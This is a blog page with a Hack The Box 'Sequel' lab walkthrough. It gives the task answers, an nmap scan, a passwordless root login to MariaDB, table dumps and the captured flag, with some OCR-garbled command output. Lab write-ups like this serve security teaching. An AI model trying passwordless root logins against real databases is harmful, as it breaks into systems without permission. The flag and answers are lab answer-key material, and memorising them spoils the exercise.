<!DOCTYPE html><html lang="en">
	<!-- Power by astro.build, bulma.io and pages.cloudflare.com -->
	<head>
		<meta charset="UTF-8">
		<meta name="viewport" content="width=device-width, initial-scale=1">
		<link rel="stylesheet" href="https://cdn.jsdelivr.net/npm/bulma@0.9.4/css/bulma.min.css">
		<link rel="stylesheet" href="/styles/global.css">
		<link rel="stylesheet" href="/styles/code_theme.css">
		<!-- <script src="https://code.jquery.com/jquery-3.6.1.min.js" integrity="sha256-o88AwQnZB+VDvE9tvIXrMQaPlFFSUTR+nldQm1LuPXQ=" crossorigin="anonymous"></script> -->
		<title>[Hack The Box] [Starting Point] [Tier 1] Sequel | Versun</title>
		<link rel="icon" type="image/x-icon" href="/avatar.jpg">
	</head>
	<body>
			<nav class="tabs mb-4 has-background-warning">
    
    <ul>
        <li><a class="has-text-black navbar-item" href="/">Home</a></li>
    </ul>

</nav><section class="section">
    <div class="container content" id="post">
      <h2 class="subtitle">[Hack The Box] [Starting Point] [Tier 1] Sequel</h2>
      <p><strong>TASK 1</strong></p>
<p><strong>What does the acronym SQL stand for?</strong> Structured Query Language</p>
<p><strong>TASK 2</strong></p>
<p><strong>During our scan, which port running mysql do we find?</strong> 3306</p>
<p><strong>TASK 3</strong></p>
<p><strong>What community-developed MySQL version is the target running?</strong> MariaDB</p>
<p><strong>TASK 4</strong></p>
<p><strong>What switch do we need to use in order to specify a login username for the MySQL service?</strong> -u</p>
<p><strong>TASK 5</strong></p>
<p><strong>Which username allows us to log into MariaDB without providing a password?</strong> root</p>
<p><strong>TASK 6</strong></p>
<p><strong>What symbol can we use to specify within the query that we want to display everything inside a table?</strong> *</p>
<p><strong>TASK 7</strong></p>
<p><strong>What symbol do we need to end each query with?</strong> ;</p>
<p><strong>SUBMIT FLAG</strong></p>
<p>Steps:</p>
<p>mysql  -u  root  -h  ip</p>
<blockquote>
<p>show databases;</p>
</blockquote>
<blockquote>
<p>use htb;</p>
</blockquote>
<blockquote>
<p>show tables;</p>
</blockquote>
<blockquote>
<p>select * from config;</p>
</blockquote>
<hr>
<p>Note:</p>
<p><a href="/attachments/Sequel.pdf">Sequel.pdf</a> <sup><a href="#user-content-fn-1" id="user-content-fnref-1" data-footnote-ref="" aria-describedby="footnote-label">1</a></sup></p>
<p><a href="https://www.interviewbit.com/blog/mysql-commands/">MySQL Commands: Full List With Examples - InterviewBit</a></p>
<p>sudo apt install mysql*</p>
<section data-footnotes="" class="footnotes"><h2 class="sr-only" id="footnote-label">Footnotes</h2>
<ol>
<li id="user-content-fn-1">
<p>Sequel Write-up
Prepared by: One-nine9, ilinor
Introduction
Learning how to navigate databases is of considerable importance because most of the critical data is
stored in them, including usernames and passwords, which can potentially be used to gain the highest
privileged access to the target system. We have already touched on the subject of databases in previous
write-ups. However, in this one, we are going to learn how to navigate through them.
The reason web servers and other services use databases such as MySQL, MariaDB, or other technologies is
to store the accumulated data somewhere easily accessible and well-organized. That data could represent
usernames, passwords, posts, messages, the exact date when the users joined, and other information -
depending on the website’s purpose. Every database contains tables, which in turn contain rows and
columns. For example, if there is a website that has a small social network and e-commerce section, there
would be a need for several separate sections which should not be inter-accessible:
. One containing users’ private information, such as email addresses, geolocations, log-in history, and
attached IP addresses, real names, credit card information, and more.
. One containing publicly searchable information such as products, services, music, videos, and other
types.
SQL Service
Databases
Tables
Columns
Data
Rows
An excellent example of how an SQL Service typically operates is the log-in process utilized for any user.
Each time the user wants to log in, the web application sends the log-in page input (username/password
combination) to the SQL Service, comparing it with stored database entries for that specific user. Suppose
the specified username and password match any entry in the database. In that case, the SQL Service will
report it back to the web application, which will, in turn, log the user in, giving them access to the restricted
parts of the website. Post-log-in, the web application will set the user a special permission in the form of a
cookie or authentication token that associates his online presence with his authenticated presence on the
website. This cookie is stored both locally, on the user’s browser storage, and the webserver.
Afterward, if the user wants to search through the list items listed on the page for something in particular,
he will input the object’s name in a search bar, which will trigger the same SQL Service to run the SQL query
on behalf of the user. Suppose an entry for the searched item exists in the database, typically under a
different table. In that case, the associated information is retrieved and sent to the web application to be
presented as images, text, links, and other types, such as comments and reviews.
Permissions Check &#x26; Query Translation
…
”. …
Client
Web Application
SQL Service
..User Search
In our case, however, we will not need to access the SQL Service through the Web Application. Upon
scanning the target, we will find a direct way of “talking” to the SQL Service by ourselves.
Enumeration
Starting with the nmap scan, so we can check what ports are open and what services are running on them:
-SC: Performs a script scan using the default set of scripts. It is equivalent to —
script=default. Some of the scripts in this category are considered intrusive and
should not be run against a target network without permission.
-SV: Enables version detection, which will detect what versions are running on what
port.
$ sudo nmap -sC -sV {target_IP}
Starting Nmap 7.91 ( <a href="https://nmap">https://nmap</a>. org ) at 2021-07-10 14:57 CEST
Nmap scan report for {target_IP}
Host is up (0.069s latency).
Not shown: 999 closed ports
PORT
STATE SERVICE VERSION
3306/tcp open mysql
MySQL 5.5.5-10.3.27-MariaDB-0+deb10ul
mysql-info:
Protocol : 10
Version: 5.5.5-10.3.27-MariaDB-0+deb10ul
Thread ID: 37
Capabilities flags: 63486
Some Capabilities: FoundRows, ODBCClient, Support41Auth, DontAllowDatabaseTableColumn,
LongColumnFlag, SupportsCompression, ConnectWithDatabase, Speaks41ProtocolOld,
Speaks41ProtocolNew, IgnoreSpaceBeforeParenthesis, SupportsLoadDataLocal, IgnoreSigpipes,
InteractiveClient, SupportsTransactions, SupportsAuthPlugins, SupportsMultipleResults,
SupportsMultipleStatments
Status: Autocommit
Salt: | ixAwY5; j’ | aQNv’Zr0q
Auth Plugin Name: mysql_native_password
Service detection performed. Please report any incorrect results at <a href="https://nmap.org/submit/">https://nmap.org/submit/</a> .
Nmap done: 1 IP address (1 host up) scanned in 2.28 seconds
We only found one open port - 3306, which runs a service named MySQL 5.5.5-10.3.27-MariaDB-
0+deblou1 . MySQL is a service designed for database management: creating, modifying, and updating
databases, changing and adding data, and more.
Foothold
In order to communicate with the database, we need to install either mysql or mariadb on our local
machine. To do that, you need to run the following command. Make sure you include the * symbol at the
end of the command to include all the related MySQL packages available. This will cover all of your needs for
now.
sudo apt update &#x26; &#x26; sudo apt install mysql*
After the installation is complete, you can run the following command to see how the service commands are
used.
…
$ mysql —help
mysql Ver 15.1 Distribl0.5.10-MariaDB, for debian-linux-gnu (x86_64) using EditLine wrapper
Copyright (c) 2000, 2018, Oracle, MariaDB Corporation Ab and others.
Usage: mysql [OPTIONS] [database]
Default options are read from the following files in the given order:
/etc/my . cnf /etc/mysql/my. cnf ~/. my . cnf
-?, —help
Display this help and exit.
-I, —help
Synonym for -?
-D, —database=name Database to use.
-h, —host=name
Connect to host.
-P, —password [=name ]
Password to use when connecting to server. If password is
not given it’s asked from the tty.
-P, —port=#
Port number to use for connection or 0 for default to, in
order of preference, my . cnf, $MYSQL_TCP_PORT,
/etc/services, built-in default (3306).
, —table
Output in table format.
-U, —user=name
User for login if not current user.
-V,
—verbose
Write more. (-v -v -v gives the table output format).
-V, —version
Output version information and exit.
Note that the MySQL clients usually authenticate with the service with a username/password combination.
However, it is essential to test for passwordless authentication, as there might be an intentional
misconfiguration in the service, which would allow personnel to easily log into the service during the
deployment stage of the project to easily interact with it before making it available to other colleagues. In
the present situation, an initial attempt can be to attempt a log-in as the root user, naturally having the
highest level of privileges on the system.
-h : Connect to host.
-u : User for log-in if not current user.
.. .
$ mysql -h {target_IP} -u root
Welcome to the MariaDB monitor. Commands end with ; or \g.
Your MariaDB connection id is 46
Server version: 10.3.27-MariaDB-0+deb10ul Debian 10
Copyright (c) 2000, 2018, Oracle, MariaDB Corporation Ab and others.
Type ‘help; ’ or ‘\h’ for help. Type ‘\c’ to clear the current input statement.
MariaDB [ ( none ) ]>
With an ounce of luck, our connection is accepted without a password requirement. We are placed in a
MySQL service shell from where we can explore the tables and data therein that are available to us. If you
need help with MySQL command syntax, you can refer to the cheatsheet provided by MySQLTutorial.
The commands we are going to use are essential for navigation:
SHOW databases;
: Prints out the databases we can access.
USE {database_name) ;
: Set to use the database named {database_name) .
SHOW tables;
: Prints out the available tables inside the current
database.
SELECT * FROM {table_name) ;
: Prints out all the data from the table {table_name).
Note that it is essential to end each command with the ; symbol, as it declares the end of the command.
Apart from that, SQL is a query-oriented language, which means that you supply it with one query at a time.
…
MariaDB [(none) ]> SHOW databases;
| Database
htb
information_schema
mysql
performance_schema
4 rows in set (0. 066 sec )
MariaDB [( none) ]>
From the output, the htb database seems to be of value to us. In order to see what rests inside it, we will
need to “select” the htb database as the active one - the database we want to actively interact with for our
subsequent commands. To achieve this, the USE htb; command can be used.
…
MartaDB [ (none ) ]> USE htb;
Reading table information for completion of table and column names
You can turn off this feature to get a quicker startup with -A
Database changed
MariaDB [htb]>
We have successfully changed the database. The next step is to check what tables does the htb database
contain. We can achieve this by following up with the SHOW tables; command.
…
MariaDB [htb]> SHOW tables;
Tables_in_htb
config
users
2 rows in set (0. 062 sec )
MariaDB [htb]>
We have two tables: config and users . These can be checked sequentially for their content by using the
SELECT * FROM {table_name) command, where {table_name} is the exact name of the table you want
to explore, taken from the output above. Once we query the config table for contents, the flag entry is
output in our terminal, alongside its’ value…
MariaDB [htb]> SELECT * FROM config;
id | name
value
timeout
60s
security
default
auto_logon
false
IOUAWN
max_size
2M
flag
7b4bec00d1a39e3dd4e021ec3d915da8
enable_uploads
false
authentication_method
radius
7 rows in set (0. 062 sec )
MariaDB [htb]>
With the collection of the sought flag, this target can be wrapped up.
Congratulations! <a href="#user-content-fnref-1" data-footnote-backref="" class="data-footnote-backref" aria-label="Back to content">↩</a></p>
</li>
</ol>
</section>
    </div>
  </section><hr>
<script src="https://giscus.app/client.js" data-repo="versun/Tiny-Website-by-Astro" data-repo-id="R_kgDOH8gn5w" data-category="Announcements" data-category-id="DIC_kwDOH8gn584CRQOD" data-mapping="title" data-strict="0" data-reactions-enabled="1" data-emit-metadata="0" data-input-position="top" data-theme="light_high_contrast" data-lang="en" crossorigin="anonymous" async>
</script><footer class="container has-text-centered mt-6">
  <span>
    -<strong> 2022 · <a href="https://versun.me">Versun</a> · <a href="https://versun.me/rss.xml">rss</a></strong> -
    <br>
    Source code licensed <a href="https://mit-license.org/" target="_blank">MIT.</a>
    Website content licensed <a rel="license" href="https://creativecommons.org/licenses/by-nc-sa/4.0/" target="_blank">CC BY-NC-SA 4.0</a>
    <br>
    <p>Last Update: 2022/12/17
</p>
  </span>
  <div style="color: transparent">
    This is a honeypot:
    <a href="mailto:2j9BV8WX3@versun.me" style="color: transparent">
      2j9BV8WX3@versun.me
    </a>
    Please do not use it unless you are a spambot.
  </div>
</footer>
	</body></html>